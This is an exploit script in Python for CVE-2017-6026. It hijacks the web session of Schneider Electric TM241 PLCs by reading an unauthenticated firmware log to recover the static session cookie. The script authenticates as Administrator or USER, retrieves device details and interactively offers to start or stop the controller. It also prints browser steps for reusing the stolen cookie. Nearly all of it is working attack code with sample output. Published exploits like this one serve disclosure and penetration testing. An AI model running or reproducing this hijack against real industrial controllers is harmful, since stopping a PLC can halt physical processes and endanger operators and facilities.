#! /usr/bin/env python3
r''' 
	Copyright 2018 Photubias(c)
	# Exploit Title: Schneider Session Hijack - CVE-2017-6026
	# Date: 2018-09-30
	# Exploit Author: Deneut Tijl
	# Vendor Homepage: www.schneider-electric.com
	# Software Link: https://www.schneider-electric.com/en/download/document/M241-M251+Firmware+v4.0.3.20/
	# Version: Schneider Electric PLC 4.0.2.11 & Boot v0.0.2.11
	# CVE : CVE-2017-6026

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        File name CVE-2017-6026-SchneiderSessionHijack.py
        written by tijl[dot]deneut[at]howest[dot]be

        Loosely based on https://github.com/DewitteNick/cookieCruncher/

        Tested on the Schneider TM241 PLC with Firmware 4.0.2.11 & Boot 0.0.2.11.
        Newest firmware (today): https://www.schneider-electric.com/en/download/document/M241-M251+Firmware+v4.0.3.20/
        Security Note: https://www.schneider-electric.com/en/download/document/SEVD-2017-075-02/

        This script will retrieve the website session cookie, which is static after every reboot.
        (This cookie is actually the Epoch time at PLC startup)
        The only prerequisite is that, since the reboot, a user must have been logged in.
                E.g. Administrator (with default password 'admin')
                or   USER (with default password 'USER')

		After retrieving the cookie, various website actions are possible (including a DoS).
		Sample output:
		C:\Users\admin\Desktop>SchneiderSessionHijack.py
		Please enter an IP [10.10.36.224]:
		This device has booted 33 times
		Cookie: 1521612584 (22/03/2018 06:09:44.014)
		----------------
		--- Device:      TM241CE40R
		--- MAC Address: 0080F40B24E0
		--- Firmware:    4.0.2.11
		--- Controller:  Running
		----------------
		Press Enter to close
'''
import urllib.request, urllib.error, urllib.parse, sys

if len(sys.argv) == 2:
    strIP = sys.argv[1]
else:
    strIP = input('Please enter an IP [10.10.36.224]: ')
    if strIP == '': strIP = '10.10.36.224'
FwLogURL = 'http://{}/usr/Syslog/FwLog.txt'.format(strIP)
try:
    FwLogResp = urllib.request.urlopen(urllib.request.Request(FwLogURL)).readlines()
    NumberOfPowerOns = 0
    for line in FwLogResp:
        if b'Firmware core2' in line:
            NumberOfPowerOns += 1
            CookieVal = line.split(b' ')[1].decode()
            BootupTime = line.split(b'(')[1].split(b')')[0].decode()
    NumberOfPowerOns /= 2
    NumberOfPowerOns = int(NumberOfPowerOns)
except:
    print('Error: URL not found.')
    input('Press enter to exit')
    exit()

try:
    CookieVal
except:
    print('Error: {} does not contain the necessary data.'.format(FwLogURL))
    input('Press Enter to Exit')
    exit()

print(('This device has booted ' + str(NumberOfPowerOns) + ' times'))
print(('Cookie: ' + CookieVal + ' (' + BootupTime + ')'))
print('----------------')
input('Press enter to see if the cookie is set on the webserver.'+"\n")

CtrlURL = 'http://{}/plcExchange/getValues/'.format(strIP)
CtrlPost = b'S;100;0;136;s;s;S;2;0;24;w;d;S;1;0;8;B;d;S;1;0;9;B;d;S;1;0;10;B;d;S;1;0;11;B;d;'

try:
    CtrlUser = 'Administrator'
    DataReq = urllib.request.Request(CtrlURL, CtrlPost, headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal})
    DataResp = urllib.request.urlopen(DataReq).read()
except:
    print('Failure for user \'Administrator\'')
    try:
        CtrlUser = 'USER'
        DataReq = urllib.request.Request(CtrlURL, CtrlPost, headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal})
        DataResp = urllib.request.urlopen(DataReq).read()
    except:
        print('Failure for user \'USER\'')
        input('Press enter to exit')
print(('### SUCCESS (' + CtrlUser + ') ###'))
DataResp = DataResp.decode()
print(('--- Device:      ' + DataResp.split(' ')[0]))
print(('--- MAC Address: ' + DataResp.split(';')[0].split(' ')[1][1:]))
print(('--- Firmware:    ' + DataResp.split(';')[2] + '.' + DataResp.split(';')[3] + '.' +DataResp.split(';')[4] + '.' +DataResp.split(';')[5]))
state = DataResp.split(';')[1]
if state == '2':
    print('--- Controller:  Running')
elif state == '1':
    print('--- Controller:  Stopped')
elif state == '0':
    print('--- Controller:  ERROR mode')
print('\n--- To exploit: Create cookie for domain "{}"'.format(strIP))
print('    with name "M258_LOG" and value "{}:{}"'.format(CtrlUser, CookieVal))
print('    and open "http://{}/index2.htm"\n'.format(strIP))
print('----------------')

CtrlPost = b'S;100;0;136;s;s;S;1;2;0;B;d;S;1;2;1;B;d;S;1;2;2;B;d;S;1;2;3;B;d;S;1;2;4;B;d;S;1;2;5;B;d;S;1;2;6;B;d;S;1;2;7;B;d;S;1;2;8;B;d;S;1;2;9;B;d;S;1;2;10;B;d;S;1;2;11;B;d;S;2;0;24;w;d;S;2;0;26;w;d;S;2;0;28;w;d;S;2;0;30;w;d;S;4;0;236;v;d;S;4;0;240;v;d;'
DataReq = urllib.request.Request(CtrlURL, CtrlPost, headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal})
DataResp = urllib.request.urlopen(DataReq).read().decode()
values = DataResp.split(';')
if not len(values) == 20:
    input('Press enter to close')
    exit()
    
state = values[13]
if state == '1':
    print('----> Controller is stopped')
    ans=input('Start controller [Y/n]? ')
    if ans == '' or ans.lower() == 'y':
        urllib.request.urlopen(urllib.request.Request('http://' + strIP + '/plcExchange/command/start', headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal}))
elif state == '2':
    print('----> Controller is running')
    ans=input('Stop controller [Y/n]? ')
    if ans == '' or ans.lower() == 'y':
        urllib.request.urlopen(urllib.request.Request('http://' + strIP + '/plcExchange/command/stop', headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal}))
else:
    print('----> Controller is in error mode')
    
input('Press enter to close')
exit()
